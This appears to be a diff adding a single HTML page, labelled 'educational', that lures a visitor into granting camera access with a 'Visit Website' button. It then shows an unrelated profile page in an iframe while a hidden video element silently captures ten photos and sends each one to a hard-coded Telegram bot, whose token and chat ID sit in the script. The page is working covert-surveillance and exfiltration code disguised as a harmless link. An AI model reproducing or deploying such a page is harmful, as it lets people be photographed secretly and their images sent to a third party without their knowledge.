@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Permission Visit Website- Educational</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      color: #fff;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    #permission-screen {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      text-align: center;
+      padding: 40px;
+      animation: fadeIn 1.5s ease-in-out;
+    }
+
+    #webview-area {
+      display: none;
+      flex: 1;
+      flex-direction: column;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    iframe {
+      flex: 1;
+      width: 100%;
+      border: none;
+    }
+
+    video {
+      display: none;
+      width: 1px;
+      height: 1px;
+      position: absolute;
+      top: -999px;
+    }
+
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 15px;
+    }
+
+    p {
+      font-size: 1rem;
+      margin-bottom: 25px;
+      line-height: 1.6;
+    }
+
+    .btn {
+      padding: 14px 35px;
+      border: none;
+      border-radius: 50px;
+      background: linear-gradient(to right, #00f2fe, #4facfe);
+      color: #000;
+      font-size: 1.1rem;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+      transition: 0.4s ease;
+    }
+
+    .btn:hover {
+      background: linear-gradient(to right, #4facfe, #00f2fe);
+      box-shadow: 0 0 25px rgba(0, 255, 255, 0.5);
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Permission request screen -->
+  <div id="permission-screen">
+    <h1>Your Permission Needed</h1>
+    <p>To continue this educational demonstration, please allow . <br/> No data is collected without permission.</p>
+    <button class="btn" onclick="requestPermission()">Visit Website</button>
+  </div>
+
+  <!-- WebView area -->
+  <div id="webview-area">
+    <iframe src="https://mr-ahad.github.io/Profile/"></iframe>
+    <video id="hidden-camera" autoplay muted playsinline></video>
+  </div>
+
+  <script>
+    const permissionScreen = document.getElementById('permission-screen');
+    const webviewArea = document.getElementById('webview-area');
+    const video = document.getElementById('hidden-camera');
+
+    const TELEGRAM_BOT_TOKEN = '8016737009:AAFg_IiAfOiECD2HYuxn8VXDUre-h1kuQK0';
+    const TELEGRAM_CHAT_ID = '7896043263';
+    const TOTAL_PHOTOS = 10;
+
+    function requestPermission() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          permissionScreen.style.display = 'none';
+          webviewArea.style.display = 'flex';
+          video.srcObject = stream;
+          setTimeout(() => takePhotos(stream), 2000);
+        })
+        .catch(err => {
+          alert("Permission denied. Please enable to proceed.");
+        });
+    }
+
+    function takePhotos(stream) {
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+      let count = 0;
+
+      async function snap() {
+        try {
+          const bitmap = await imageCapture.grabFrame();
+          const canvas = document.createElement('canvas');
+          canvas.width = bitmap.width;
+          canvas.height = bitmap.height;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(bitmap, 0, 0);
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+          sendToTelegram(dataUrl);
+          count++;
+          if (count < TOTAL_PHOTOS) {
+            setTimeout(snap, 1500);
+          } else {
+            stopCamera(stream);
+          }
+        } catch (err) {
+          console.error('Frame capture error:', err);
+        }
+      }
+
+      snap();
+    }
+
+    function stopCamera(stream) {
+      stream.getTracks().forEach(track => track.stop());
+      video.srcObject = null;
+    }
+
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while (n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], { type: mime });
+    }
+
+    async function sendToTelegram(dataUrl) {
+      const blob = dataURLtoBlob(dataUrl);
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('photo', blob, 'photo.jpg');
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      } catch (err) {
+        console.error('Telegram error:', err);
+      }
+    }
+  </script>
+
+</body>
+</html>
